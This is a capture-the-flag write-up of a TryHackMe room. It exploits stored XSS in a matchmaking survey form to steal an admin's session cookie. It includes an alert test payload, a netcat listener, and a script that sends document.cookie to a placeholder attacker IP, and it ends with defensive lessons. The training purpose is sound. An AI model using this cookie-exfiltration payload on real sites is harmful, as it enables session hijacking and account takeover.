# Cupid’s Matchmaker – TryHackMe Writeup

## 1. Introduction

Cupid’s Matchmaker is a beginner-friendly web challenge from TryHackMe’s “Love At First Breach 2026” event that focuses on exploiting a stored XSS vulnerability to steal an admin cookie. The scenario is a matchmaking site that promises “no AI, just real humans reading your personality survey,” which is the main hint that someone privileged will later view your submitted content.

The goal of the room is to inject JavaScript into the survey form so that, when the “human reviewer” (admin/bot) opens it, your payload runs in their browser and exfiltrates their session cookie, which serves as the flag.

---

## 2. Environment Setup and Initial Recon

After starting the room:

- I connected to TryHackMe using the AttackBox/VPN.
- I opened the Cupid’s Matchmaker web application from the room’s access link.
- I browsed the homepage to understand the flow:
  - Fill out a personality survey.
  - A human “expert” reviews it.
  - You get matched later.

The important detail here is that the submission will be reviewed later by someone else, which strongly suggests a stored XSS opportunity: my input might be stored and then rendered in another user’s (admin) browser.

I also quickly clicked around to see available pages (home, survey) and confirmed that the main interactive component is the survey form itself.

---

## 3. Analysing the Survey Form

Clicking “Take survey” opens a form asking for various details like:

- Name and basic profile info.
- Preferences and what you’re looking for.
- A free-text area (for example “Tell us about yourself” / “Describe your ideal partner”).

These free-text fields are prime candidates for injection because they often accept arbitrary input and are later displayed back somewhere in the application.

Based on the room description and the survey structure, my hypothesis was:

- The survey answers are stored on the server.
- A reviewer (admin/bot) opens a page that displays those answers.
- If the application does not properly encode user input, any HTML/JavaScript I submit could execute in the reviewer’s browser.
- If that JavaScript can access `document.cookie`, I can send the admin’s cookie to my own machine.

This is exactly the type of situation where stored XSS becomes dangerous.

---

## 4. Testing for Stored XSS

To confirm that stored XSS is possible:

- I filled in all required fields with normal, harmless data.
- In a free-text field (such as “About you”), I injected a simple XSS test payload like:

```html
<script>alert('XSS');</script>

I submitted the survey and got a confirmation message saying the team would review my submission.

As the normal user, I did not see the alert box, which is expected for stored XSS. The payload is likely stored in the database and only executed when someone else (the reviewer) opens the submission in their interface.

This behavior matches the usual pattern of stored XSS: the malicious script is saved on the server and executes in the browser of whoever loads the affected content later.

5. Setting Up a Listener for Cookie Theft

Once I suspected stored XSS in the reviewer view, the next step was to steal the admin’s session cookie when they load my submission.

First, I prepared a listener on my machine:

I chose a dummy public IP for the writeup: 203.0.113.10.

In a real attack, this would be my own VPN/AttackBox IP (for example, from ifconfig on tun0).

I started a netcat listener on port 8080:

nc -lvnp 8080

This listener will capture any incoming HTTP request. The plan is to have the admin’s browser automatically send a request to http://203.0.113.10:8080 with their cookie attached as a URL parameter.

6. Crafting the Final Stored XSS Payload

With the listener running, I created a payload that exfiltrates the admin’s cookie via a simple HTTP request.

I used an Image object to avoid dealing with CORS or fetch restrictions:

<script>
  new Image().src = 'http://203.0.113.10:8080/?c=' + document.cookie;
</script>
Explanation

new Image() creates an image object in the browser.

Setting .src makes the browser issue a GET request to the specified URL.

I append document.cookie to the query parameter c.

So the request looks like:

GET /?c=<cookie_here> HTTP/1.1
7. Exploitation

I then:

Went back to the Cupid’s Matchmaker survey page.

Filled the required fields again.

Placed the payload into a free-text field (e.g., “About you”).

Submitted the survey and waited for the reviewer.

When the admin/bot opened my submission, the script executed in their browser context and sent their cookie to my netcat listener.

On my terminal running nc, I saw a request similar to:

GET /?c=session=FLAG_VALUE_HERE HTTP/1.1
Host: 203.0.113.10:8080
User-Agent: Mozilla/5.0 ...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

The important part is:

/?c=session=FLAG_VALUE_HERE

The value after session= is the admin’s cookie, which serves as the flag.

8. Submitting the Flag

After capturing the request:

Extracted the cookie/flag value from the line starting with GET /?c=...

Copied just the flag portion (e.g., FLAG_VALUE_HERE)

Submitted it in the TryHackMe answer box

The submission was accepted, completing the challenge.

9. Lessons Learned

From this room, the main security lessons are:

Stored XSS is more dangerous than reflected XSS because the payload persists on the server and executes in other users’ browsers, often with higher privileges (like admins).

Features that involve “human review,” moderation, or admin dashboards are high-risk if user-generated content is rendered without proper HTML escaping.

Cookie Theft Works Because:

Cookies are not marked HttpOnly, so JavaScript can read document.cookie.

There is no Content Security Policy (CSP) restricting data exfiltration.

Defenses Include:

Output encoding/sanitization of user-controlled data

Using HttpOnly and Secure cookie flags

Implementing CSP to restrict script execution and data exfiltration

10. Skills Practiced

Recognizing stored XSS vulnerabilities

Crafting JavaScript payloads

Cookie exfiltration techniques

Using netcat to capture HTTP requests

Understanding real-world web exploitation
